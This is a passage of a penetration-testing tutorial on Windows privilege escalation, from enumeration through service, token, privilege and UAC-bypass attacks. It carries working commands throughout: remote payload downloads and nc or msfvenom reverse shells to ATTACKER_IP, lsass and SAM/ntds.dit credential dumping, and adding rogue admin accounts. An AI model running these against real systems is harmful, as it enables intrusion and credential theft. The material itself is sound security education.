---
title: Windows Privilege Escalation Techniques
description: A comprehensive guide to understanding and exploiting Windows privilege escalation vectors — from initial enumeration to SYSTEM — for penetration testers, red teamers, and defenders.
navigation:
  icon: i-simple-icons-windows
---

## Introduction

**Windows Privilege Escalation** is the process of leveraging a vulnerability, misconfiguration, or design weakness to elevate access — typically from a **standard user** or **service account** to **NT AUTHORITY\SYSTEM** or **Administrator**. In Active Directory environments, it's a critical stepping stone toward **domain compromise**.

::note
Unlike Linux, Windows privilege escalation often revolves around **services**, **tokens**, **the registry**, and **access control lists (ACLs)**. Understanding the Windows security model is essential before attempting escalation.
::

::card-group
  ::card
  ---
  title: What You'll Learn
  icon: i-lucide-book-open
  ---
  - Windows privilege and token model
  - 15+ escalation techniques with commands
  - Service misconfigurations, token abuse, UAC bypass
  - Potato attacks (SeImpersonate)
  - Credential harvesting and Pass-the-Hash
  - Detection and hardening strategies
  ::

  ::card
  ---
  title: Key Context
  icon: i-lucide-info
  ---
  - **Phase:** Post-Exploitation
  - **Goal:** `NT AUTHORITY\SYSTEM` or local Administrator
  - **MITRE ATT&CK:** [TA0004 — Privilege Escalation](https://attack.mitre.org/tactics/TA0004/)
  - **Difficulty:** Beginner → Advanced
  - **Platforms:** Windows 10/11, Server 2016–2025
  ::
::

::caution
This content is for **authorized security testing and education only**. Performing privilege escalation on systems without explicit written authorization is **illegal** and violates computer fraud laws (CFAA, Computer Misuse Act, and equivalent laws worldwide).
::

---

## Understanding Windows Privileges

Before escalating, you must understand how Windows manages **access, tokens, and integrity levels**.

### The Windows Privilege Hierarchy

```
┌─────────────────────────────────────────────────────────────┐
│                  NT AUTHORITY\SYSTEM                         │
│        Highest local privilege — full kernel access          │
│        Services, drivers, core OS processes                  │
├─────────────────────────────────────────────────────────────┤
│                   Local Administrators                       │
│        BUILTIN\Administrators group                         │
│        UAC-restricted unless elevated                        │
├─────────────────────────────────────────────────────────────┤
│              High Integrity (Elevated Admin)                │
│        Admin processes after UAC prompt                      │
│        Full admin privileges active                          │
├─────────────────────────────────────────────────────────────┤
│              Medium Integrity (Standard User)               │
│        Default for user processes                            │
│        Limited privileges — your starting point              │
├─────────────────────────────────────────────────────────────┤
│              Low Integrity (Restricted)                      │
│        Sandboxed processes — browsers, Adobe Reader          │
│        Very limited file/registry access                     │
├─────────────────────────────────────────────────────────────┤
│              Untrusted Integrity                             │
│        Anonymous / null session processes                    │
└─────────────────────────────────────────────────────────────┘
```

### Key Security Concepts

::card-group
  ::card
  ---
  title: Access Tokens
  icon: i-lucide-ticket
  ---
  Every process runs with an **access token** containing the user's SID, group memberships, and **privileges** (like `SeImpersonatePrivilege`). Escalation often means stealing or manipulating a higher-privileged token.
  ::

  ::card
  ---
  title: Integrity Levels
  icon: i-lucide-layers
  ---
  Windows assigns an **integrity level** to every process and object. A process at **Medium** integrity cannot write to **High** integrity objects — even if file permissions allow it.

  | Level | Label | SID |
  |---|---|---|
  | System | `S-1-16-16384` | OS kernel |
  | High | `S-1-16-12288` | Elevated admin |
  | Medium | `S-1-16-8192` | Standard user |
  | Low | `S-1-16-4096` | Sandboxed |
  ::

  ::card
  ---
  title: User Account Control (UAC)
  icon: i-lucide-shield
  ---
  UAC limits Administrator accounts by running processes at **Medium** integrity by default. Elevation to **High** integrity requires the UAC prompt — or a **bypass**.
  ::

  ::card
  ---
  title: Privileges (SePrivileges)
  icon: i-lucide-key-round
  ---
  Special rights assigned to tokens. Some are extremely dangerous:

  - `SeImpersonatePrivilege` → token theft
  - `SeDebugPrivilege` → process injection
  - `SeBackupPrivilege` → read any file
  - `SeTakeOwnershipPrivilege` → own any object
  - `SeLoadDriverPrivilege` → load kernel drivers
  - `SeRestorePrivilege` → write any file
  ::
::

### Critical Files & Locations

| Location | Purpose | Escalation Relevance |
|---|---|---|
| `C:\Windows\System32\config\SAM` | Local password hashes | Dump for cracking/PTH |
| `C:\Windows\System32\config\SYSTEM` | System encryption keys | Needed to decrypt SAM |
| `C:\Windows\System32\config\SECURITY` | LSA secrets, cached creds | Domain credential cache |
| `C:\Users\<user>\AppData\` | Application data, configs | Stored credentials |
| `C:\ProgramData\` | Shared application data | Writable configs |
| `C:\Windows\Panther\Unattend.xml` | Automated install answers | Plaintext passwords |
| `C:\Windows\repair\SAM` | SAM backup copy | May be readable |
| `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` | Auto-start programs | Registry autoruns |
| `HKLM\SYSTEM\CurrentControlSet\Services\` | Service configurations | Unquoted paths, DLL hijack |

---

## Phase 1 — Enumeration

::tip
**Enumeration is everything.** A missed configuration is a missed shell. Be thorough and systematic before attempting any exploit.
::

### Manual Enumeration

::tabs
  :::tabs-item{icon="i-lucide-user" label="User & System Info"}
  ```powershell [PowerShell — User Information]
  # Who am I?
  whoami
  whoami /priv          # Current privileges (CRITICAL!)
  whoami /groups        # Group memberships
  whoami /all           # Everything

  # All local users
  net user
  Get-LocalUser

  # User details
  net user Administrator

  # Local groups
  net localgroup
  net localgroup Administrators

  # Domain information (if domain-joined)
  systeminfo | findstr /B /C:"Domain"
  whoami /fqdn

  # Currently logged in
  query user
  qwinsta
  ```

  ```powershell [PowerShell — System Information]
  # OS and patch level
  systeminfo
  systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"

  # Architecture
  [Environment]::Is64BitOperatingSystem

  # Hostname
  hostname

  # Environment variables (may contain creds)
  set
  Get-ChildItem Env: | Format-Table -AutoSize

  # PowerShell version
  $PSVersionTable

  # .NET version
  Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse |
    Get-ItemProperty -Name version -EA 0 | Select PSChildName, version

  # Installed patches (look for missing patches)
  wmic qfe list full
  Get-HotFix | Sort-Object InstalledOn -Descending | Select -First 20
  ```
  :::

  :::tabs-item{icon="i-lucide-shield" label="Privileges & Tokens"}
  ```powershell [PowerShell — Dangerous Privileges]
  # List current privileges — THIS IS CRITICAL
  whoami /priv

  # Look for these enabled/disabled dangerous privileges:
  # SeImpersonatePrivilege    → Potato attacks (SYSTEM)
  # SeAssignPrimaryTokenPrivilege → Token manipulation
  # SeDebugPrivilege          → Process injection
  # SeBackupPrivilege         → Read any file
  # SeRestorePrivilege        → Write any file
  # SeTakeOwnershipPrivilege  → Own any object
  # SeLoadDriverPrivilege     → Load kernel driver
  # SeChangeNotifyPrivilege   → Traverse checking bypass

  # If you see SeImpersonatePrivilege — you're likely
  # a service account and can get SYSTEM via Potato attacks
  ```

  ```cmd [CMD — Check UAC Configuration]
  # UAC level
  reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System

  # Key values:
  # EnableLUA = 1             → UAC enabled
  # ConsentPromptBehaviorAdmin = 0 → No prompt (silent elevate)
  # ConsentPromptBehaviorAdmin = 5 → Default (prompt)
  # LocalAccountTokenFilterPolicy = 1 → Remote admin access allowed
  ```
  :::

  :::tabs-item{icon="i-lucide-cog" label="Services & Processes"}
  ```powershell [PowerShell — Service Enumeration]
  # All services
  Get-Service | Format-Table Name, Status, StartType
  Get-WmiObject win32_service | Select Name, StartName, PathName, State |
    Format-Table -AutoSize

  # Services running as SYSTEM (high value targets)
  Get-WmiObject win32_service |
    Where-Object { $_.StartName -like "*LocalSystem*" -or $_.StartName -like "*SYSTEM*" } |
    Select Name, PathName, State | Format-Table -AutoSize

  # Look for unquoted service paths
  Get-WmiObject win32_service |
    Where-Object { $_.PathName -notlike '"*' -and $_.PathName -like '* *' } |
    Select Name, PathName, StartName | Format-Table -AutoSize

  # Check service permissions (using accesschk)
  accesschk.exe /accepteula -uwcqv "Everyone" * /a
  accesschk.exe /accepteula -uwcqv "Users" * /a
  accesschk.exe /accepteula -uwcqv "Authenticated Users" * /a
  ```

  ```powershell [PowerShell — Running Processes]
  # Processes with their owners
  Get-Process -IncludeUserName | Format-Table Name, Id, UserName -AutoSize

  # Processes running as SYSTEM
  Get-Process -IncludeUserName |
    Where-Object { $_.UserName -like "*SYSTEM*" } |
    Select Name, Id | Format-Table -AutoSize

  # Installed software
  Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" |
    Select DisplayName, DisplayVersion, Publisher | Sort-Object DisplayName |
    Format-Table -AutoSize

  Get-ItemProperty "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" |
    Select DisplayName, DisplayVersion | Format-Table -AutoSize
  ```
  :::

  :::tabs-item{icon="i-lucide-network" label="Network & Firewall"}
  ```powershell [PowerShell — Network Enumeration]
  # Network interfaces
  ipconfig /all
  Get-NetIPAddress | Format-Table InterfaceAlias, IPAddress, PrefixLength

  # Routing table
  route print
  Get-NetRoute

  # Active connections and listening ports
  netstat -ano
  Get-NetTCPConnection -State Listen | Format-Table LocalAddress, LocalPort, OwningProcess

  # Map ports to processes
  Get-NetTCPConnection -State Listen |
    Select LocalPort, @{Name="Process";Expression={(Get-Process -Id $_.OwningProcess).Name}} |
    Sort-Object LocalPort | Format-Table -AutoSize

  # ARP table
  arp -a
  Get-NetNeighbor

  # DNS cache
  ipconfig /displaydns

  # Shares
  net share
  Get-SmbShare

  # Firewall rules
  netsh advfirewall show allprofiles
  Get-NetFirewallRule -Enabled True | Format-Table Name, Direction, Action -AutoSize

  # Wi-Fi passwords (if applicable)
  netsh wlan show profiles
  netsh wlan show profile name="SSID" key=clear
  ```
  :::

  :::tabs-item{icon="i-lucide-file-search" label="Files & Registry"}
  ```powershell [PowerShell — Sensitive File Search]
  # Unattend/Sysprep files (often contain passwords)
  Get-ChildItem -Path C:\ -Recurse -Force -ErrorAction SilentlyContinue -Include `
    Unattend.xml, sysprep.xml, sysprep.inf, unattended.xml

  # Configuration files
  Get-ChildItem -Path C:\ -Recurse -Force -ErrorAction SilentlyContinue -Include `
    *.config, *.ini, *.xml, *.txt, *.cfg, *.env, web.config |
    Select-String -Pattern "password|passwd|pwd|credential|secret|connectionstring" -List |
    Select Path

  # Recently modified files
  Get-ChildItem -Path C:\ -Recurse -Force -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-7) -and !$_.PSIsContainer } |
    Select FullName, LastWriteTime | Sort-Object LastWriteTime -Descending | Select -First 30

  # PowerShell history
  Get-Content (Get-PSReadLineOption).HistorySavePath 2>$null
  Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\*.txt

  # Saved RDP connections
  reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"

  # Putty saved sessions (may contain creds)
  reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
  ```

  ```powershell [PowerShell — Registry Credential Mining]
  # AutoLogon credentials (plaintext!)
  reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>$null |
    findstr /i "DefaultUserName DefaultPassword DefaultDomainName"

  # Saved credentials in Credential Manager
  cmdkey /list

  # VNC passwords
  reg query "HKCU\Software\ORL\WinVNC3\Password" 2>$null
  reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v Password 2>$null

  # SNMP community strings
  reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities" 2>$null

  # Wi-Fi passwords
  netsh wlan show profiles | findstr "All User"

  # AlwaysInstallElevated (MSI exploitation)
  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>$null
  reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>$null
  ```
  :::

  :::tabs-item{icon="i-lucide-folder-open" label="Writable Locations"}
  ```powershell [PowerShell — Permission Checks]
  # Writable directories in PATH
  $env:PATH -split ';' | ForEach-Object {
      $acl = Get-Acl $_ -ErrorAction SilentlyContinue
      $acl.Access | Where-Object {
          $_.IdentityReference -match "Users|Everyone|Authenticated" -and
          $_.FileSystemRights -match "Write|FullControl|Modify"
      } | ForEach-Object {
          Write-Host "[!] Writable PATH dir: $_" -ForegroundColor Red
      }
  }

  # Writable service executables
  Get-WmiObject win32_service | ForEach-Object {
      $path = ($_.PathName -replace '"','').Split('.exe')[0] + '.exe'
      if (Test-Path $path) {
          $acl = Get-Acl $path -ErrorAction SilentlyContinue
          $acl.Access | Where-Object {
              $_.IdentityReference -match "Users|Everyone|Authenticated" -and
              $_.FileSystemRights -match "Write|FullControl|Modify"
          } | ForEach-Object {
              Write-Host "[!] Writable service binary: $path" -ForegroundColor Red
          }
      }
  }

  # World-writable folders
  Get-ChildItem "C:\Program Files","C:\Program Files (x86)" -Recurse -Directory -ErrorAction SilentlyContinue |
    ForEach-Object {
      $acl = Get-Acl $_.FullName -ErrorAction SilentlyContinue
      $acl.Access | Where-Object {
          $_.IdentityReference -match "Users|Everyone" -and
          $_.FileSystemRights -match "Write|FullControl"
      } | ForEach-Object {
          Write-Host "[!] Writable dir: $($_.FullName)" -ForegroundColor Red
      }
    }
  ```
  :::
::

### Automated Enumeration Tools

::tabs
  :::tabs-item{icon="i-lucide-bot" label="WinPEAS"}
  ```powershell [PowerShell — WinPEAS]
  # Download and run (recommended first tool)
  # From attacker web server
  certutil -urlcache -split -f http://ATTACKER_IP/winPEASany.exe winpeas.exe
  .\winpeas.exe | Tee-Object -FilePath winpeas_output.txt

  # Or run directly in memory
  IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/winPEAS.bat')

  # Run specific checks
  .\winpeas.exe servicesinfo
  .\winpeas.exe userinfo
  .\winpeas.exe systeminfo

  # Quiet mode (less output)
  .\winpeas.exe quiet
  ```

  ::tip
  WinPEAS color codes findings: 🔴 **RED** = almost certainly exploitable. 🟡 **YELLOW** = worth investigating. Focus on red findings first.
  ::
  :::

  :::tabs-item{icon="i-lucide-bot" label="PowerUp (PowerSploit)"}
  ```powershell [PowerShell — PowerUp]
  # Import and run all checks
  Import-Module .\PowerUp.ps1
  Invoke-AllChecks | Out-File -FilePath powerup_output.txt

  # Or load directly into memory (bypass AV)
  IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerUp.ps1')
  Invoke-AllChecks

  # Specific checks
  Get-UnquotedService
  Get-ModifiableServiceFile
  Get-ModifiableService
  Get-RegistryAlwaysInstallElevated
  Get-RegistryAutoLogon
  Get-CachedGPPPassword
  Find-ProcessDLLHijack
  ```
  :::

  :::tabs-item{icon="i-lucide-bot" label="Seatbelt"}
  ```powershell [PowerShell — Seatbelt (GhostPack)]
  # Run all security-relevant checks
  .\Seatbelt.exe -group=all

  # Specific check groups
  .\Seatbelt.exe -group=system       # OS, patches, env vars
  .\Seatbelt.exe -group=user         # User info, tokens, creds
  .\Seatbelt.exe -group=misc         # Interesting files, configs
  .\Seatbelt.exe -group=chrome       # Browser credentials

  # Individual checks
  .\Seatbelt.exe TokenPrivileges
  .\Seatbelt.exe WindowsAutoLogon
  .\Seatbelt.exe SavedRDPConnections
  .\Seatbelt.exe CredentialManager
  .\Seatbelt.exe InterestingFiles
  ```
  :::

  :::tabs-item{icon="i-lucide-bot" label="PrivescCheck"}
  ```powershell [PowerShell — PrivescCheck]
  # Modern PowerShell-based enumeration
  Import-Module .\PrivescCheck.ps1

  # Run all checks with HTML report
  Invoke-PrivescCheck -Extended -Report PrivescCheck_Report -Format HTML

  # Specific categories
  Invoke-PrivescCheck -Extended | Where-Object { $_.Severity -eq "High" }
  ```
  :::

  :::tabs-item{icon="i-lucide-bot" label="Windows Exploit Suggester"}
  ```bash [Attacker Machine — WES-NG]
  # On TARGET: export systeminfo
  systeminfo > systeminfo.txt
  # Transfer to attacker

  # On ATTACKER: run exploit suggester
  pip3 install wesng
  wes --update
  wes systeminfo.txt --impact "Elevation of Privilege" --exploits-only

  # Or use the older Python 2 version
  python windows-exploit-suggester.py --database 2024-01-01-mssb.xls \
    --systeminfo systeminfo.txt
  ```
  :::
::

---

## Phase 2 — Exploitation Techniques

### Technique 1 — Service Misconfigurations

Services are the **most common** Windows privilege escalation vector. They run with elevated privileges (often SYSTEM) and are frequently misconfigured.

::accordion
  :::accordion-item{icon="i-lucide-quote" label="Unquoted Service Paths"}

  When a service executable path contains **spaces** and is **not wrapped in quotes**, Windows tries multiple interpretations:

  ```
  Service Path: C:\Program Files\My App\Service Folder\binary.exe
  
  Windows tries these IN ORDER:
    1. C:\Program.exe
    2. C:\Program Files\My.exe
    3. C:\Program Files\My App\Service.exe   ← If we can write here!
    4. C:\Program Files\My App\Service Folder\binary.exe
  ```

  ```powershell [PowerShell — Find Unquoted Paths]
  # Method 1: WMI query
  Get-WmiObject win32_service |
    Where-Object {
      $_.PathName -notlike '"*' -and
      $_.PathName -notlike 'C:\Windows\*' -and
      $_.PathName -like '* *'
    } | Select Name, PathName, StartName, State |
    Format-Table -AutoSize

  # Method 2: Using wmic
  wmic service get name,pathname,startmode |
    findstr /i /v "C:\Windows\\" | findstr /i /v """
  ```

  ```powershell [PowerShell — Exploit Unquoted Path]
  # 1. Identify writable directory along the path
  icacls "C:\Program Files\My App\"
  # Output: BUILTIN\Users:(W)  ← Writable!

  # 2. Create malicious executable
  # On attacker: generate payload
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 \
    -f exe -o Service.exe

  # 3. Place it in the writable directory
  copy Service.exe "C:\Program Files\My App\Service.exe"

  # 4. Restart the service (or wait for reboot)
  sc stop VulnService
  sc start VulnService
  # Or: shutdown /r /t 0
  ```

  ::note
  You need **write access** to one of the intermediate directories AND the ability to **restart the service** (or wait for a system reboot).
  ::
  :::

  :::accordion-item{icon="i-lucide-file-pen" label="Writable Service Executables"}

  If you can **modify** the binary that a service runs, you can replace it with a malicious payload.

  ```powershell [PowerShell — Find Writable Service Binaries]
  # Using accesschk (Sysinternals)
  accesschk.exe /accepteula -wvu "C:\Program Files\*" 2>$null

  # Using icacls
  Get-WmiObject win32_service | ForEach-Object {
      $path = ($_.PathName -replace '"','').Split(' ')[0]
      if (Test-Path $path) {
          $result = icacls $path 2>$null | Select-String "(M|F|W)" | 
                    Select-String "Users|Everyone|Authenticated"
          if ($result) {
              Write-Host "[!] $($_.Name): $path" -ForegroundColor Red
              Write-Host "    $result"
          }
      }
  }
  ```

  ```powershell [PowerShell — Replace Service Binary]
  # 1. Backup original
  copy "C:\Program Files\VulnApp\service.exe" "C:\Program Files\VulnApp\service.exe.bak"

  # 2. Replace with payload
  copy .\malicious.exe "C:\Program Files\VulnApp\service.exe"

  # 3. Restart service
  sc stop VulnService
  sc start VulnService

  # 4. After getting shell, restore original
  copy "C:\Program Files\VulnApp\service.exe.bak" "C:\Program Files\VulnApp\service.exe"
  ```
  :::

  :::accordion-item{icon="i-lucide-settings" label="Weak Service Permissions (Service ACL)"}

  If you can **reconfigure** a service (change its binary path), you can point it to your payload — even if the original binary is protected.

  ```powershell [PowerShell — Find Modifiable Services]
  # Using accesschk
  accesschk.exe /accepteula -uwcqv "Users" * /a
  accesschk.exe /accepteula -uwcqv "Everyone" * /a
  accesschk.exe /accepteula -uwcqv "Authenticated Users" * /a

  # Look for: SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS, GENERIC_WRITE

  # Using PowerUp
  Get-ModifiableService
  ```

  ```powershell [PowerShell — Exploit Weak Service ACL]
  # 1. Check current config
  sc qc VulnService

  # 2. Change binary path to a reverse shell command
  sc config VulnService binpath= "C:\tmp\reverse.exe"

  # Or add a new admin user
  sc config VulnService binpath= "net user hacker Password123! /add"
  sc stop VulnService
  sc start VulnService

  sc config VulnService binpath= "net localgroup Administrators hacker /add"
  sc stop VulnService
  sc start VulnService

  # 3. Log in as the new admin
  # Or with PowerUp:
  Invoke-ServiceAbuse -Name 'VulnService' -UserName 'hacker' -Password 'Password123!'
  ```
  :::

  :::accordion-item{icon="i-lucide-puzzle" label="DLL Hijacking via Services"}

  If a service loads a DLL from a **writable location** or looks for a **missing DLL**, you can inject malicious code.

  ```powershell [PowerShell — Find DLL Hijack Opportunities]
  # Method 1: Process Monitor (Sysinternals)
  # Filter: Result = NAME NOT FOUND, Path ends with .dll

  # Method 2: Automated search
  Find-ProcessDLLHijack    # PowerUp
  Find-PathDLLHijack       # PowerUp

  # Method 3: Check service DLL search order
  # Windows DLL search order (for services):
  # 1. Directory of the executable
  # 2. C:\Windows\System32
  # 3. C:\Windows\System
  # 4. C:\Windows
  # 5. Current directory
  # 6. PATH directories
  ```

  ```c [malicious.dll — DLL Payload]
  // Compile: x86_64-w64-mingw32-gcc -shared -o hijack.dll hijack.c
  #include <windows.h>

  BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
      if (reason == DLL_PROCESS_ATTACH) {
          system("net user hacker Password123! /add");
          system("net localgroup Administrators hacker /add");
      }
      return TRUE;
  }
  ```

  ```bash [Attacker — Generate DLL with msfvenom]
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 \
    -f dll -o hijack.dll
  ```
  :::
::

---

### Technique 2 — Token Impersonation (Potato Attacks)

If your current user has **`SeImpersonatePrivilege`** or **`SeAssignPrimaryTokenPrivilege`**, you can steal SYSTEM tokens. This privilege is commonly assigned to **service accounts** (IIS, MSSQL, etc.).

::steps{level="4"}

#### Check for the Privilege

```powershell [PowerShell]
whoami /priv

# PRIVILEGES INFORMATION
# ----------------------
# SeImpersonatePrivilege    Impersonate a client after authentication    Enabled
# ↑ THIS IS YOUR GOLDEN TICKET TO SYSTEM
```

#### Choose Your Potato

| Tool | Windows Version | Technique | Year |
|---|---|---|---|
| **GodPotato** | Windows 2012–2022, Win 8–11 | DCOM/RPCSS | 2024 |
| **JuicyPotatoNG** | Windows 10/11, Server 2019+ | DCOM activation | 2022 |
| **PrintSpoofer** | Windows 10, Server 2016–2019 | Print Spooler named pipe | 2020 |
| **RoguePotato** | Windows 10, Server 2019 | OXID resolver | 2020 |
| **SweetPotato** | Windows 7–11, Server 2008–2022 | Multiple techniques | 2020 |
| **JuicyPotato** | Windows 7–10, Server 2008–2016 | DCOM/BITS | 2018 |
| **RottenPotato** | Windows 7–10 (older) | NTLM relay + token | 2016 |
| **Hot Potato** | Windows 7–10 (older) | NBNS + WPAD + NTLM | 2016 |

#### Execute the Attack

::

::tabs
  :::tabs-item{icon="i-lucide-flame" label="GodPotato"}
  ```powershell [PowerShell — GodPotato (Most Universal)]
  # Works on Windows Server 2012-2022 and Windows 8-11
  
  # Execute a command as SYSTEM
  .\GodPotato.exe -cmd "cmd /c whoami"
  # Output: nt authority\system

  # Reverse shell
  .\GodPotato.exe -cmd "C:\tmp\nc.exe ATTACKER_IP 4444 -e cmd.exe"

  # Add admin user
  .\GodPotato.exe -cmd "net user hacker Password123! /add"
  .\GodPotato.exe -cmd "net localgroup Administrators hacker /add"
  ```
  :::

  :::tabs-item{icon="i-lucide-printer" label="PrintSpoofer"}
  ```powershell [PowerShell — PrintSpoofer]
  # Abuses the Print Spooler service pipe
  # Works on Windows 10 and Server 2016/2019

  # Interactive SYSTEM shell
  .\PrintSpoofer64.exe -i -c cmd
  # whoami → nt authority\system

  # Execute a command
  .\PrintSpoofer64.exe -c "C:\tmp\nc.exe ATTACKER_IP 4444 -e cmd.exe"

  # Run PowerShell as SYSTEM
  .\PrintSpoofer64.exe -i -c powershell.exe
  ```
  :::

  :::tabs-item{icon="i-lucide-candy" label="SweetPotato"}
  ```powershell [PowerShell — SweetPotato]
  # Combines multiple potato techniques
  # Wide compatibility across Windows versions

  # Execute as SYSTEM
  .\SweetPotato.exe -e EfsRpc -p C:\Windows\System32\cmd.exe -a "/c whoami > C:\tmp\output.txt"

  # Try different exploits if one fails
  .\SweetPotato.exe -e WinRM -p cmd.exe -a "/c net user hacker Password123! /add"
  .\SweetPotato.exe -e SpoolFool -p cmd.exe -a "/c whoami"
  ```
  :::

  :::tabs-item{icon="i-lucide-droplet" label="JuicyPotatoNG"}
  ```powershell [PowerShell — JuicyPotatoNG]
  # For Windows 10/11 and Server 2019+
  # Bypasses limitations of original JuicyPotato

  # Interactive SYSTEM shell
  .\JuicyPotatoNG.exe -t * -p cmd.exe

  # Execute a command
  .\JuicyPotatoNG.exe -t * -p "C:\tmp\nc.exe" -a "ATTACKER_IP 4444 -e cmd.exe"
  ```
  :::
::

::warning
Potato attacks require **`SeImpersonatePrivilege`**. This is commonly held by **IIS AppPool**, **MSSQL**, **service accounts**, and processes started by services. Standard user accounts typically **do not** have this privilege.
::

---

### Technique 3 — Dangerous Privileges Abuse

Beyond `SeImpersonatePrivilege`, several other token privileges can lead to SYSTEM.

::accordion
  :::accordion-item{icon="i-lucide-bug" label="SeDebugPrivilege → Process Injection"}

  `SeDebugPrivilege` allows you to open and modify **any process**, including SYSTEM processes.

  ```powershell [PowerShell — Migrate to SYSTEM Process]
  # Method 1: Using Metasploit
  # In meterpreter:
  meterpreter> ps                    # List processes
  meterpreter> migrate <PID>         # Migrate to SYSTEM process (e.g., winlogon.exe)
  meterpreter> getuid                # Should show SYSTEM

  # Method 2: Process injection with PowerShell
  # Inject into a SYSTEM process (e.g., lsass.exe, winlogon.exe)
  # Using Invoke-TokenManipulation from PowerSploit
  Import-Module .\Invoke-TokenManipulation.ps1
  Invoke-TokenManipulation -CreateProcess "cmd.exe" -ProcessId <SYSTEM_PID>
  ```

  ```powershell [PowerShell — Dump Credentials from lsass]
  # SeDebugPrivilege also allows dumping lsass.exe memory
  # Method 1: Task Manager → Details → lsass.exe → Create dump file

  # Method 2: ProcDump (Sysinternals)
  procdump.exe -accepteula -ma lsass.exe lsass.dmp

  # Method 3: comsvcs.dll (LOLBin — no external tools)
  # Find lsass PID
  tasklist /fi "imagename eq lsass.exe"
  # Dump using rundll32
  rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\tmp\lsass.dmp full

  # Transfer dump to attacker and extract with Mimikatz
  mimikatz# sekurlsa::minidump lsass.dmp
  mimikatz# sekurlsa::logonpasswords
  ```
  :::

  :::accordion-item{icon="i-lucide-hard-drive" label="SeBackupPrivilege → Read Any File"}

  `SeBackupPrivilege` lets you **read any file** on the system, bypassing all ACLs.

  ```powershell [PowerShell — Extract SAM & SYSTEM Hives]
  # Backup-privileged copy of registry hives
  reg save HKLM\SAM C:\tmp\SAM
  reg save HKLM\SYSTEM C:\tmp\SYSTEM
  reg save HKLM\SECURITY C:\tmp\SECURITY

  # Transfer to attacker machine and dump hashes
  # Using Impacket
  secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL

  # Or dump ntds.dit from Domain Controller
  # Create shadow copy
  wmic shadowcopy call create Volume=C:\
  # Copy ntds.dit from shadow
  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\tmp\ntds.dit
  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\tmp\SYSTEM

  # Extract on attacker
  secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
  ```
  :::

  :::accordion-item{icon="i-lucide-crown" label="SeTakeOwnershipPrivilege → Own Any Object"}

  Take ownership of protected files, then grant yourself access.

  ```powershell [PowerShell — Take Ownership and Read]
  # Take ownership of a protected file
  takeown /f "C:\Windows\System32\config\SAM"

  # Grant yourself read access
  icacls "C:\Windows\System32\config\SAM" /grant %username%:F

  # Now you can read/copy it
  copy "C:\Windows\System32\config\SAM" C:\tmp\SAM
  ```
  :::

  :::accordion-item{icon="i-lucide-cpu" label="SeLoadDriverPrivilege → Kernel Driver"}

  Load a **vulnerable kernel driver** to gain kernel-level code execution.

  ```powershell [PowerShell — Load Vulnerable Driver]
  # 1. Use Capcom.sys (known vulnerable driver)
  # 2. Load it into the kernel
  # 3. Execute arbitrary code in Ring 0

  # Using EoPLoadDriver
  .\EoPLoadDriver.exe System\CurrentControlSet\MyDriver C:\tmp\Capcom.sys

  # Then use ExploitCapcom to execute as SYSTEM
  .\ExploitCapcom.exe
  ```

  ::caution
  Driver loading attacks can cause **BSOD** (Blue Screen of Death) if done incorrectly. Use with extreme caution in production environments.
  ::
  :::
::

---

### Technique 4 — UAC Bypass

If you're running as a local **Administrator** but at **Medium integrity** (UAC-restricted), you need to bypass UAC to get **High integrity**.

```powershell [PowerShell — Check Current Integrity Level]
whoami /groups | findstr "Label"
# Medium Mandatory Level → UAC restricted
# High Mandatory Level   → Already elevated
```

::tabs
  :::tabs-item{icon="i-lucide-shield-off" label="Fodhelper.exe Bypass"}
  ```powershell [PowerShell — Fodhelper UAC Bypass (Windows 10/11)]
  # fodhelper.exe auto-elevates and reads a registry key we control

  # 1. Set malicious command in registry
  New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
  New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" `
    -Name "(Default)" -Value "cmd.exe /c start C:\tmp\reverse.exe" -Force
  New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" `
    -Name "DelegateExecute" -Value "" -Force

  # 2. Trigger fodhelper (auto-elevates without UAC prompt)
  Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

  # 3. Clean up
  Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force

  # Result: cmd.exe runs at HIGH integrity
  ```
  :::

  :::tabs-item{icon="i-lucide-shield-off" label="Eventvwr.exe Bypass"}
  ```powershell [PowerShell — Event Viewer UAC Bypass]
  # eventvwr.exe reads from HKCU before HKLM (registry hijack)

  # 1. Create the registry path
  New-Item "HKCU:\Software\Classes\mscfile\Shell\Open\command" -Force
  Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\Shell\Open\command" `
    -Name "(Default)" -Value "cmd.exe /c C:\tmp\reverse.exe"

